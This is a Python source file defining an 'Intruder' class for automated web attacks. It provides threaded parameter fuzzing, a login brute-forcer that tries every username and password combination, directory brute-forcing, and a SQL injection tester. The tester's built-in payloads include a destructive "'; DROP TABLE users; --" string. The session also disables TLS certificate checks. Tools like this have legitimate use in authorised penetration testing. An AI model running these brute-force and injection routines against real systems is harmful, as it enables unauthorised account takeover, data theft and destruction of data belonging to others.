"""
Intruder tool for automated attacks and fuzzing
"""

import requests
import threading
import time
from typing import List, Dict, Any, Callable, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed


class Intruder:
    """Tool for automated attacks and fuzzing"""
    
    def __init__(self, max_threads: int = 10):
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.verify = False
        
    def fuzz_parameter(self, url: str, parameter: str, wordlist: List[str], 
                      method: str = "GET", headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """Fuzz a parameter with a wordlist"""
        results = []
        
        def fuzz_single(payload: str) -> Dict[str, Any]:
            try:
                params = {parameter: payload}
                response = self.session.request(
                    method=method,
                    url=url,
                    params=params,
                    headers=headers or {},
                    timeout=10
                )
                
                return {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'url': response.url,
                    'success': True
                }
            except Exception as e:
                return {
                    'payload': payload,
                    'error': str(e),
                    'success': False
                }
                
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(fuzz_single, payload): payload for payload in wordlist}
            
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                
        return results
        
    def brute_force_auth(self, url: str, username_field: str, password_field: str,
                        usernames: List[str], passwords: List[str],
                        method: str = "POST", headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """Brute force authentication"""
        results = []
        
        def try_credentials(username: str, password: str) -> Dict[str, Any]:
            try:
                data = {username_field: username, password_field: password}
                response = self.session.request(
                    method=method,
                    url=url,
                    data=data,
                    headers=headers or {},
                    timeout=10
                )
                
                return {
                    'username': username,
                    'password': password,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'success': True,
                    'url': response.url
                }
            except Exception as e:
                return {
                    'username': username,
                    'password': password,
                    'error': str(e),
                    'success': False
                }
                
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {}
            for username in usernames:
                for password in passwords:
                    future = executor.submit(try_credentials, username, password)
                    futures[future] = (username, password)
                    
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                
        return results
        
    def directory_brute_force(self, base_url: str, wordlist: List[str]) -> List[Dict[str, Any]]:
        """Brute force directories and files"""
        results = []
        
        def check_path(path: str) -> Dict[str, Any]:
            try:
                url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
                response = self.session.get(url, timeout=10)
                
                return {
                    'path': path,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'url': url,
                    'success': True
                }
            except Exception as e:
                return {
                    'path': path,
                    'error': str(e),
                    'success': False
                }
                
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(check_path, path): path for path in wordlist}
            
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                
        return results
        
    def sql_injection_test(self, url: str, parameter: str, payloads: List[str] = None) -> List[Dict[str, Any]]:
        """Test for SQL injection vulnerabilities"""
        if payloads is None:
            payloads = [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT 1,2,3--",
                "1' OR 1=1--",
                "admin'--",
                "' OR 1=1#",
                "' OR 'x'='x"
            ]
            
        results = []
        
        def test_payload(payload: str) -> Dict[str, Any]:
            try:
                params = {parameter: payload}
                response = self.session.get(url, params=params, timeout=10)
                
                # Check for SQL error indicators
                error_indicators = [
                    'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                    'sql error', 'database error', 'query failed'
                ]
                
                has_error = any(indicator in response.text.lower() for indicator in error_indicators)
                
                return {
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'has_sql_error': has_error,
                    'url': response.url,
                    'success': True
                }
            except Exception as e:
                return {
                    'payload': payload,
                    'error': str(e),
                    'success': False
                }
                
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(test_payload, payload): payload for payload in payloads}
            
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                
        return results